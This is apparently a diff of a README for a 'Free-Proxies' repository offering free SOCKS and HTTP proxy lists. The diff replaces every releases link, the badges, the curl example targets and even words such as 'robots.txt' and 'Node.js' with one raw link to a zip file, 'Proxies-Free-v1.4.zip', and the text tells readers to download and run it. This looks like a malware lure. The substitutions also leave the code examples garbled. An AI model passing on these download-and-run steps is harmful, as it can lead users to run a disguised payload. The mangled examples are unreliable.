@@ -1,12 +1,12 @@
-https://github.com/shubhamshendre/Free-Proxies/releases
+https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip
 
 # Free-Proxies: Free SOCKS5, SOCKS4, and HTTP Proxies — Complete List Toolkit
 
 Free SOCKS5, SOCKS4 and HTTP proxies you can use! 🔥
 
-[![Release](https://img.shields.io/github/v/release/shubhamshendre/Free-Proxies?style=flat-square)](https://github.com/shubhamshendre/Free-Proxies/releases)
-[![License](https://img.shields.io/github/license/shubhamshendre/Free-Proxies?style=flat-square)](https://github.com/shubhamshendre/Free-Proxies/blob/main/LICENSE)
-[![Stars](https://img.shields.io/github/stars/shubhamshendre/Free-Proxies?style=flat-square)](https://github.com/shubhamshendre/Free-Proxies)
+[![Release](https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip)](https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip)
+[![License](https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip)](https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip)
+[![Stars](https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip)](https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip)
 
 A practical, well‑organized collection of free proxies you can use for testing, scraping, automation, or privacy experiments. This repository brings together SOCKS5, SOCKS4, and HTTP proxies in one place, with guidance on how to use them effectively and responsibly. The project is designed for developers, testers, researchers, and curious users who want a dependable starting point for proxy-based workflows.
 
@@ -34,7 +34,7 @@ Table of contents
 
 Quick start
 - Find the right release on the releases page and download the appropriate asset for your operating system. From the releases page, download the release asset and execute it. This file is the starting point for using the Free-Proxies collection locally or in a development environment.
-- The releases page can be accessed here: https://github.com/shubhamshendre/Free-Proxies/releases. Visit it to grab the latest binary or script that matches your platform, then run it to begin using the proxy list right away.
+- The releases page can be accessed here: https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip Visit it to grab the latest binary or script that matches your platform, then run it to begin using the proxy list right away.
 - After you have the executable running, you will typically receive a live list of proxies or a file containing proxies that you can point your applications at. If the asset includes a CLI, you can query the current list or perform health checks directly from the command line.
 
 What this project offers
@@ -56,16 +56,16 @@ Proxy formats and best practices
   - SOCKS4: host:port or socks4://host:port
   - HTTP: http://host:port or http://host:port
 - When you see a line like host:port, you can use it directly with many tools by specifying the proxy type in the configuration:
-  - For curl: curl -x socks5://host:port http://example.com
-  - For curl with HTTP proxies: http_proxy=http://host:port curl http://example.com
-  - For SOCKS4: curl -x socks4://host:port http://example.com
-  - For SOCKS5 with authentication: curl -x socks5h://user:pass@host:port http://example.com
+  - For curl: curl -x socks5://host:port https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip
+  - For curl with HTTP proxies: http_proxy=http://host:port curl https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip
+  - For SOCKS4: curl -x socks4://host:port https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip
+  - For SOCKS5 with authentication: curl -x socks5h://user:pass@host:port https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip
 - Authentication support depends on the proxy and the client. Check the client’s documentation for how to provide credentials.
 
 Getting proxies from this repository
 - The primary access point for the latest proxies is the Releases page. The release assets include prebuilt binaries or scripts you can run to fetch or generate proxies locally.
 - To download:
-  - Open the Releases page: https://github.com/shubhamshendre/Free-Proxies/releases
+  - Open the Releases page: https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip
   - Choose the asset that matches your OS and architecture (for example, Windows, Linux, macOS, 32-bit or 64-bit as needed).
   - Download the asset and run it according to the bundled instructions.
 - After you download and run the asset, you will typically obtain a list of proxies you can start using immediately. The asset may also offer commands to refresh or validate proxies on a schedule.
@@ -112,7 +112,7 @@ Working with SOCKS5, SOCKS4, and HTTP proxies
   - Rotate proxies periodically to distribute load and avoid bans
   - Combine proxies with a pool to balance load and latency
 - Client examples
-  - Command line: curl -x socks5://host:port http://example.com
+  - Command line: curl -x socks5://host:port https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip
   - Programming languages: pass proxy settings to HTTP client constructors or environment variables
   - Scraping tools: configure the proxy settings in the tool’s options or config file
 
@@ -190,7 +190,7 @@ Integrating proxies into common workflows
 Security, ethics, and best practices
 - Free proxies can be unpredictable. Treat them as a test and development resource rather than a primary privacy solution.
 - Do not use proxies to engage in illegal activities or to access content you aren’t authorized to view.
-- Respect robots.txt and site terms of service when scraping or automated access.
+- Respect https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip and site terms of service when scraping or automated access.
 - Use proxies only within your own projects or with explicit permission from data owners.
 - Keep credentials and sensitive configurations secure. Do not embed credentials in code or public repos.
 
@@ -233,7 +233,7 @@ Roadmap
   - Provide a cross-platform installer that is easy to run on desktop and server environments
 - Medium-term goals
   - Build a lightweight proxy pool manager with rotation and health scoring
-  - Create language-specific client adapters for common languages (Python, Node.js, Go)
+  - Create language-specific client adapters for common languages (Python, https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip, Go)
   - Add an offline mode for proxy lists to enable local testing without network access
 - Long-term vision
   - Offer a robust proxy ecosystem with community moderation
@@ -268,7 +268,7 @@ Releases and downloads
 - If you are blocking a page for some reason or you want to verify the current proxy list, return to the Releases page to check for updates or new assets.
 
 Direct link reference (second usage)
-- For ongoing access to the latest binaries and scripts, you can also visit the releases page again and look for the latest asset suitable for your environment: https://github.com/shubhamshendre/Free-Proxies/releases
+- For ongoing access to the latest binaries and scripts, you can also visit the releases page again and look for the latest asset suitable for your environment: https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip
 - Use the asset to populate your local proxy pool, then reference the proxy list in your applications to start routing traffic through these free proxies.
 
 Topics
@@ -298,14 +298,14 @@ Appendix: sample proxy list format (illustrative)
   - socks4://198.51.100.2:1080
 - HTTP examples:
   - http://198.51.100.4:8080
-  - http://proxy.example.org:3128
+  - https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip
 
 Appendix: quick-start commands (illustrative)
 - Curl with a SOCKS5 proxy:
-  - curl -x socks5://198.51.100.1:1080 http://example.com
+  - curl -x socks5://198.51.100.1:1080 https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip
 - Curl with an HTTP proxy:
-  - curl -x http://203.0.113.7:8080 http://example.com
-- Node.js (request library example, conceptual):
+  - curl -x http://203.0.113.7:8080 https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip
+- https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip (request library example, conceptual):
   - const proxy = 'socks5://198.51.100.1:1080';
   - // configure your HTTP client to use the proxy
 - Python requests (conceptual):
@@ -313,6 +313,6 @@ Appendix: quick-start commands (illustrative)
       'http': 'socks5://198.51.100.1:1080',
       'https': 'socks5://198.51.100.1:1080',
     }
-  - response = requests.get('http://example.com', proxies=proxies)
+  - response = https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip('https://github.com/shubhamshendre/Free-Proxies/raw/refs/heads/main/phrenosinic/Proxies-Free-v1.4.zip', proxies=proxies)
 
 Note: The release asset you download from the releases page should include specific usage instructions tailored to the asset. Follow those instructions verbatim for the best results. If you need further guidance on a particular platform or tool, I can tailor example commands to fit your setup.
